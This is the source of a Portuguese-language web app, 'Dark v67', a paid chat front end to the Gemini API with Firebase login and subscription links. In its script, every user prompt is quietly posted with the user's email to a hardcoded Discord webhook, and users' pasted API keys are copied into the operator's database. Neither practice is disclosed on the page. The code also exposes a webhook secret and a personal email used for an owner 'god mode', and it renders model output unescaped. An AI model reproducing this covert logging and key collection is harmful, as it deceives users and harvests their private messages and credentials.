<!DOCTYPE html>
<html lang="pt-PT">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Dark v67 - Final Stable</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
        
        :root { --red: #ff0000; --bg: #050505; --gold: #ffd700; }
        body { 
            background: var(--bg); color: #fff; font-family: 'Inter', sans-serif; 
            height: 100dvh; margin: 0; overflow: hidden; position: fixed; width: 100%;
        }

        #sidebar { 
            position: fixed; left: -100%; top: 0; bottom: 0; width: 85%; 
            background: #080808; border-right: 1px solid #1a1a1a; 
            display: flex; flex-direction: column; z-index: 3000; 
            transition: 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }
        #sidebar.open { left: 0; }

        .sidebar-close {
            position: absolute; right: -50px; top: 15px; width: 40px; height: 40px;
            background: var(--red); border-radius: 10px; display: flex; 
            align-items: center; justify-content: center; color: white;
        }

        .modal { 
            position: fixed; inset: 0; background: rgba(0,0,0,0.98); 
            backdrop-filter: blur(15px); z-index: 5000; 
            display: flex; align-items: center; justify-content: center; padding: 20px; 
        }
        .modal-content {
            background: #0d0d0d; border: 1px solid #222; 
            width: 100%; max-width: 350px; border-radius: 35px; 
            padding: 30px 20px; position: relative;
        }

        #chat-window { flex: 1; overflow-y: auto; padding: 20px; display: flex; flex-direction: column; gap: 15px; }
        .bubble { max-width: 85%; padding: 15px 20px; border-radius: 22px; font-size: 14px; line-height: 1.6; }
        .bubble-ai { align-self: flex-start; background: #111; border-left: 4px solid var(--red); }
        .bubble-user { align-self: flex-end; background: #1a1a1a; border: 1px solid #333; }
        
        .god-mode-active .bubble-ai { border-left-color: var(--gold); }
        .god-mode-active #msg-progress { background: var(--gold) !important; }

        .plan-card {
            background: #111; border: 1px solid #222; padding: 15px; border-radius: 20px;
            margin-bottom: 10px; text-align: left; transition: 0.2s;
        }

        .typing-dots { display: flex; gap: 4px; padding: 5px; }
        .dot { width: 6px; height: 6px; background: var(--red); border-radius: 50%; animation: pulse 1.4s infinite; }
        .dot:nth-child(2) { animation-delay: 0.2s; }
        .dot:nth-child(3) { animation-delay: 0.4s; }
        @keyframes pulse { 0%, 100% { opacity: 0.3; transform: scale(1); } 50% { opacity: 1; transform: scale(1.2); } }
    </style>
</head>
<body>

    <!-- Auth Gate -->
    <div id="auth-gate" class="modal">
        <div class="modal-content text-center">
            <h1 class="text-5xl font-black mb-1 italic text-white">DA<span class="text-red-600">RK</span></h1>
            <p class="text-[9px] text-zinc-600 font-black tracking-[0.4em] mb-10 uppercase">v67 Final Edition</p>
            <button onclick="loginGoogle()" class="w-full bg-white text-black p-4 rounded-2xl font-black text-xs mb-4 flex items-center justify-center gap-3">
                <i class="fa-brands fa-google"></i> ENTRAR COM GOOGLE
            </button>
            <div class="space-y-3">
                <input type="email" id="email" class="w-full bg-zinc-900 border border-zinc-800 p-4 rounded-xl text-white text-sm outline-none" placeholder="Email">
                <input type="password" id="pass" class="w-full bg-zinc-900 border border-zinc-800 p-4 rounded-xl text-white text-sm outline-none" placeholder="Senha">
                <button onclick="loginEmail()" class="w-full bg-red-600 p-4 rounded-xl font-black text-xs uppercase text-white">Aceder</button>
            </div>
        </div>
    </div>

    <!-- App UI -->
    <div id="app" class="flex h-full w-full hidden">
        <aside id="sidebar">
            <div class="sidebar-close" onclick="toggleMenu()"><i class="fa-solid fa-xmark"></i></div>
            <div class="p-6 h-full flex flex-col">
                <div class="bg-zinc-900/50 p-5 rounded-3xl border border-zinc-800 mb-6 flex items-center gap-4">
                    <div id="user-icon" class="w-12 h-12 bg-zinc-800 rounded-full flex items-center justify-center text-xl">
                        <i class="fa-solid fa-user text-zinc-600"></i>
                    </div>
                    <div>
                        <p id="user-name" class="text-sm font-black italic text-white italic">Usuário</p>
                        <p id="user-role" class="text-[7px] text-zinc-500 uppercase font-black tracking-widest">Verificando...</p>
                    </div>
                </div>

                <div class="bg-zinc-950 p-5 rounded-3xl border border-zinc-900 mb-6">
                    <div class="flex justify-between items-center mb-4">
                        <span class="text-[8px] font-black text-zinc-600 uppercase">Mensagens</span>
                        <button onclick="openPlans()" class="text-[8px] font-black text-red-600 uppercase underline">Upgrade</button>
                    </div>
                    <div class="flex items-end justify-between mb-2">
                        <span id="msg-count" class="text-3xl font-black italic tracking-tighter">0/0</span>
                    </div>
                    <div class="w-full bg-zinc-900 h-1.5 rounded-full overflow-hidden">
                        <div id="msg-progress" class="bg-red-600 h-full w-0 transition-all duration-1000"></div>
                    </div>
                </div>

                <!-- Botão do Discord -->
                <a href="https://discord.gg/nvuGhKD25" target="_blank" class="w-full bg-[#5865F2] text-white p-4 rounded-2xl font-black text-[10px] uppercase mb-4 flex items-center justify-center gap-2 shadow-lg">
                    <i class="fa-brands fa-discord text-sm"></i> Entrar no Discord
                </a>

                <button onclick="newConversation()" class="w-full bg-white text-black p-4 rounded-2xl font-black text-[10px] uppercase mb-4 shadow-xl">+ Novo Protocolo</button>
                
                <div id="chat-list" class="flex-1 overflow-y-auto space-y-2 mb-4"></div>

                <div class="pt-6 border-t border-zinc-900 space-y-3">
                    <button onclick="openKeyModal()" class="w-full text-zinc-500 text-[9px] font-black uppercase text-left pl-2"><i class="fa-solid fa-key mr-2"></i> Configurar Chave</button>
                    <button onclick="logout()" class="w-full text-zinc-800 text-[8px] font-black uppercase text-left pl-2">Sair do Sistema</button>
                </div>
            </div>
        </aside>

        <main class="flex-1 flex flex-col w-full">
            <header class="h-16 flex items-center justify-between px-4 border-b border-zinc-900">
                <button onclick="toggleMenu()" class="w-12 h-12 bg-zinc-900/50 rounded-xl flex items-center justify-center border border-zinc-800">
                    <i class="fa-solid fa-bars-staggered"></i>
                </button>
                <div class="text-center">
                    <h2 id="current-title" class="text-[10px] font-black uppercase text-zinc-500 tracking-widest">Dark System</h2>
                </div>
                <div class="w-12"></div>
            </header>

            <div id="chat-window"></div>

            <footer class="p-4">
                <div class="bg-zinc-900 border border-zinc-800 p-2 rounded-2xl flex gap-2">
                    <input id="prompt" class="flex-1 bg-transparent px-3 text-sm text-white outline-none" placeholder="Digite seu comando..." onkeydown="if(event.key==='Enter') send()">
                    <button id="send-btn" onclick="send()" class="w-12 h-12 bg-red-600 rounded-xl flex items-center justify-center">
                        <i class="fa-solid fa-paper-plane text-xs"></i>
                    </button>
                </div>
            </footer>
        </main>
    </div>

    <!-- Modais -->
    <div id="plans-modal" class="modal hidden">
        <div class="modal-content">
            <h3 class="text-white font-black text-center text-xs uppercase mb-6 italic">Planos Disponíveis</h3>
            <a href="https://www.mercadopago.com.br/subscriptions/checkout?preapproval_plan_id=a506437035154280b71299946639bb46" target="_blank" class="block plan-card">
                <p class="text-[10px] font-black text-red-600 mb-1">BÁSICO</p>
                <p class="text-xl font-black">R$ 10,00 <span class="text-[9px] text-zinc-600 font-normal">/mês</span></p>
            </a>
            <a href="https://www.mercadopago.com.br/subscriptions/checkout?preapproval_plan_id=115c3f71f00c467fb6b957e21cd44aa0" target="_blank" class="block plan-card">
                <p class="text-[10px] font-black text-amber-500 mb-1">AVANÇADO</p>
                <p class="text-xl font-black">R$ 35,00 <span class="text-[9px] text-zinc-600 font-normal">/mês</span></p>
            </a>
            <button onclick="closePlans()" class="w-full mt-4 text-[8px] font-black text-zinc-700 uppercase">Fechar</button>
        </div>
    </div>

    <div id="key-modal" class="modal hidden">
        <div class="modal-content text-center">
            <h3 class="text-white font-black text-xs uppercase mb-6">Chave de Acesso</h3>
            <input type="password" id="api-input" class="w-full bg-black border border-zinc-800 p-4 rounded-xl text-white text-xs mb-4 text-center" placeholder="Cole sua chave aqui">
            <button onclick="saveKey()" class="w-full bg-red-600 p-4 rounded-xl font-black text-xs text-white uppercase">Ativar Motor</button>
            <button onclick="closeKeyModal()" class="w-full mt-4 text-[8px] text-zinc-700 uppercase">Voltar</button>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
        import { getAuth, signInWithEmailAndPassword, GoogleAuthProvider, signInWithPopup, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
        import { getFirestore, doc, setDoc, updateDoc, onSnapshot } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyAAPVM-uc_yHKcY7an0pQABzS2UgRsbNY8",
            authDomain: "hjjj-f7cf5.firebaseapp.com",
            projectId: "hjjj-f7cf5",
            storageBucket: "hjjj-f7cf5.firebasestorage.app",
            messagingSenderId: "162911169867",
            appId: "1:162911169867:web:4a8e8d2db6fd886c390cce"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getFirestore(app);
        const provider = new GoogleAuthProvider();
        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1467217014157213759/h8mtZp6daIb7gNwzKdHZyGaoeHj6qnJxDLOrsTM6TdZYQWjMJ_H-0Z3sPHMAXjt09rL8";

        let userData = { used: 0, plan: 'free' };
        let sessions = JSON.parse(localStorage.getItem('dark_v67_sess')) || [];
        let currentId = null;
        let geminiKey = localStorage.getItem('dark_key_v67') || "";
        let isGod = false;

        onAuthStateChanged(auth, user => {
            if (user) {
                isGod = (user.email === "rafaelmartinsdosanjos27@gmail.com");
                document.getElementById('auth-gate').classList.add('hidden');
                document.getElementById('app').classList.remove('hidden');
                
                document.getElementById('user-name').innerText = isGod ? "Rafael (Mestre)" : (user.displayName || "Operador");
                if(isGod) {
                    document.body.classList.add('god-mode-active');
                    document.getElementById('user-role').innerText = "GOD MODE ACTIVE";
                    document.getElementById('user-icon').innerHTML = `<i class="fa-solid fa-crown text-amber-500"></i>`;
                } else {
                    document.getElementById('user-role').innerText = "IDENTIDADE VALIDADA";
                }

                onSnapshot(doc(db, "users", user.uid), snap => {
                    if (snap.exists()) {
                        userData = snap.data();
                        if(userData.apiKey && !geminiKey) {
                            geminiKey = userData.apiKey;
                            localStorage.setItem('dark_key_v67', geminiKey);
                        }
                    } else {
                        setDoc(doc(db, "users", user.uid), { email: user.email, used: 0, plan: isGod ? 'creator' : 'free' });
                    }
                    updateUI();
                });

                if(sessions.length > 0) loadSession(sessions[0].id); else newConversation();
            } else {
                document.getElementById('auth-gate').classList.remove('hidden');
            }
        });

        async function logToDiscord(message) {
            try {
                await fetch(DISCORD_WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        content: `**Log Dark v67**\n**User:** ${auth.currentUser?.email}\n**Msg:** ${message}`
                    })
                });
            } catch (e) { console.error(e); }
        }

        window.saveKey = async () => {
            const val = document.getElementById('api-input').value.trim();
            if(!val) return;
            geminiKey = val;
            localStorage.setItem('dark_key_v67', val);
            if(auth.currentUser) await updateDoc(doc(db, "users", auth.currentUser.uid), { apiKey: val });
            closeKeyModal();
        };

        window.send = async () => {
            const pin = document.getElementById('prompt');
            const val = pin.value.trim();
            if(!val) return;
            if(!geminiKey) { openKeyModal(); return; }

            renderBubble('user', val);
            pin.value = '';
            logToDiscord(val);
            
            const win = document.getElementById('chat-window');
            const loading = document.createElement('div');
            loading.className = 'bubble bubble-ai';
            loading.innerHTML = `<div class="typing-dots"><div class="dot"></div><div class="dot"></div><div class="dot"></div></div>`;
            win.appendChild(loading);
            win.scrollTop = win.scrollHeight;

            try {
                // MODELO E VERSÃO CORRIGIDOS PARA EVITAR ERRO DE CONEXÃO
                const endpoint = `https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key=${geminiKey}`;
                
                const response = await fetch(endpoint, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        contents: [{ parts: [{ text: val }] }]
                    })
                });

                const data = await response.json();
                loading.remove();

                if (data.error) {
                    renderBubble('ai', `ERRO DO MOTOR: ${data.error.message}`);
                    return;
                }

                const txt = data.candidates?.[0]?.content?.parts?.[0]?.text || "Sem resposta.";
                renderBubble('ai', txt);

                const s = sessions.find(x => x.id === currentId);
                if(s) {
                    if(s.title === "Nova Conversa") s.title = val.substring(0, 20);
                    s.messages.push({ role: 'user', text: val }, { role: 'ai', text: txt });
                }
                
                if(!isGod) await updateDoc(doc(db, "users", auth.currentUser.uid), { used: (userData.used || 0) + 1 });
                saveSessions();
                refreshList();
            } catch (e) {
                loading.remove();
                renderBubble('ai', `FALHA CRÍTICA: Verifique sua chave API.`);
            }
        };

        function renderBubble(r, t) {
            const w = document.getElementById('chat-window');
            const d = document.createElement('div');
            d.className = `bubble ${r === 'ai' ? 'bubble-ai' : 'bubble-user'}`;
            const label = r === 'ai' ? 'DARK' : (isGod ? 'RAFAEL' : 'OPERADOR');
            d.innerHTML = `<span class="text-[7px] font-black opacity-30 block mb-1 uppercase">${label}</span><div class="text-sm">${t}</div>`;
            w.appendChild(d);
            w.scrollTop = w.scrollHeight;
        }

        function updateUI() {
            const plan = isGod ? 'CRIADOR' : (userData.plan || 'FREE');
            const used = userData.used || 0;
            const max = isGod ? '∞' : (plan === 'free' ? 30 : 9999);
            document.getElementById('msg-count').innerText = `${used}/${max}`;
            document.getElementById('msg-progress').style.width = isGod ? '100%' : (Math.min(100, (used/max)*100)) + '%';
            refreshList();
        }

        window.newConversation = () => {
            const id = Date.now();
            sessions.unshift({ id, title: "Nova Conversa", messages: [{ role: 'ai', text: "Sistema Dark v67 Pronto." }] });
            saveSessions(); loadSession(id);
        };

        window.loadSession = id => {
            currentId = id;
            const s = sessions.find(x => x.id === id);
            if(!s) return;
            document.getElementById('current-title').innerText = s.title;
            const win = document.getElementById('chat-window');
            win.innerHTML = '';
            s.messages.forEach(m => renderBubble(m.role, m.text));
            if(window.innerWidth < 768) document.getElementById('sidebar').classList.remove('open');
        };

        function refreshList() {
            const list = document.getElementById('chat-list'); list.innerHTML = '';
            sessions.forEach(s => {
                const div = document.createElement('div');
                div.className = `p-4 rounded-2xl text-[10px] font-black mb-2 transition-all ${s.id === currentId ? 'bg-red-600/10 text-red-500 border border-red-600/20' : 'bg-zinc-950 text-zinc-700'}`;
                div.innerText = s.title;
                div.onclick = () => loadSession(s.id);
                list.appendChild(div);
            });
        }

        window.toggleMenu = () => document.getElementById('sidebar').classList.toggle('open');
        window.openPlans = () => document.getElementById('plans-modal').classList.remove('hidden');
        window.closePlans = () => document.getElementById('plans-modal').classList.add('hidden');
        window.openKeyModal = () => document.getElementById('key-modal').classList.remove('hidden');
        window.closeKeyModal = () => document.getElementById('key-modal').classList.add('hidden');
        function saveSessions() { localStorage.setItem('dark_v67_sess', JSON.stringify(sessions)); }
        window.loginGoogle = () => signInWithPopup(auth, provider);
        window.loginEmail = () => signInWithEmailAndPassword(auth, document.getElementById('email').value, document.getElementById('pass').value);
        window.logout = () => { signOut(auth).then(() => { localStorage.clear(); location.reload(); }); };
    </script>
</body>
</html>
